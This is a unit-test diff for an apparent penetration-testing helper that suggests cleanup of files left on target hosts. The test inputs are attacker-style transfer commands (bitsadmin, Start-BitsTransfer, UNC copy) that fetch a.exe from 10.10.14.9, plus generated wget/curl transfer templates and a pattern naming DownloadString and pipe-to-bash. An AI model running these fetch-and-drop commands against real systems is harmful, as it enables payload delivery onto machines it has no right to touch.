@@ -3,6 +3,9 @@ import { suggestCleanup } from '../../../engines/cleanup';
 import type { Host } from '../../../types/host';
 import type { LogEntry } from '../../../types/log';
 import type { CleanupItem } from '../../../types/cleanup';
+import { transferMethods } from '../../../engines/generators/transfer';
+import { BUILTIN_LIBRARY } from '../../../engines/library/data';
+import { FIELD_MANUAL_CARDS } from '../../../engines/library/data/fieldManual';
 
 const web = { id: 'web', name: 'web01', ip: '10.0.0.50' } as unknown as Host;
 const dc = { id: 'dc', name: 'DC01', ip: '10.0.0.1' } as unknown as Host;
@@ -212,3 +215,49 @@ describe('fix round 1', () => {
   });
 });
 
+
+describe('transfer fetches', () => {
+  it('bitsadmin, UNC copy and Start-BitsTransfer fetches are suggested for cleanup', () => {
+    expect(run('bitsadmin /transfer job /download /priority normal http://10.10.14.9/a.exe C:\\Windows\\Temp\\a.exe', onWin))
+      .toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
+    expect(run('copy \\\\10.10.14.9\\share\\a.exe C:\\Windows\\Temp\\a.exe', onWin)).toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
+    expect(run('xcopy \\\\10.10.14.9\\share\\a.exe C:\\Windows\\Temp\\ /y', onWin)[0].target).toBe('C:\\Windows\\Temp\\a.exe');
+    expect(run('Start-BitsTransfer -Source http://10.10.14.9/a.exe -Destination C:\\Windows\\Temp\\a.exe', onWin))
+      .toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
+    // A copy between local paths, or on Kali, leaves nothing to clean up.
+    expect(run('copy C:\\a.txt C:\\b.txt', onWin)).toEqual([]);
+    expect(run('copy \\\\10.10.14.9\\share\\a.exe C:\\Temp\\a.exe')).toEqual([]);
+  });
+
+  it('every generator method that writes to the target yields a cleanup suggestion when logged', () => {
+    const IN_MEMORY = /DownloadString|\|\s*bash\b/;
+    const cases = [
+      { os: 'windows' as const, dir: 'C:\\Windows\\Temp', shell: onWin },
+      { os: 'linux' as const, dir: '/tmp', shell: onWeb },
+    ];
+    let checked = 0;
+    const linuxTargets = new Map<string, string[]>();
+    for (const { os, dir, shell } of cases) {
+      for (const m of transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, os)) {
+        if (m.target.length === 0 || m.target.some((c) => IN_MEMORY.test(c.template))) continue;
+        const text = m.target
+          .map((c) => c.template.replaceAll('{LHOST}', '10.10.14.9').replaceAll('{FILE}', 'x.exe').replaceAll('{DEST_DIR}', dir).replaceAll('{PORT}', '8000').replaceAll('{BASE64_PAYLOAD}', 'AAAA'))
+          .join('\n');
+        const found = suggestCleanup([cmd(text, shell)], hosts, '', []);
+        // The suggestion names the file this method put in the folder (Windows ftp: its script).
+        const targets = found.map((f) => f.target);
+        if (os === 'linux') linuxTargets.set(m.label, targets);
+        const want = os === 'windows' ? [`${dir}\\x.exe`, `${dir}\\ftp.txt`] : [`${dir}/x.exe`];
+        expect(targets.some((t) => want.includes(t)), `${m.group} / ${m.label}: ${targets.join(', ')}`).toBe(true);
+        checked++;
+      }
+    }
+    expect(checked).toBeGreaterThanOrEqual(10);
+    // The HTTP fetches that end in a chmod follow-up are still checked, by their fetch block.
+    for (const label of ['wget', 'curl', 'python3']) {
+      const hit = [...linuxTargets].find(([l]) => l === label || l.startsWith(`${label} `));
+      expect(hit, `linux ${label} was checked`).toBeDefined();
+      expect(hit![1]).toEqual(['/tmp/x.exe']);
+    }
+  });
+});
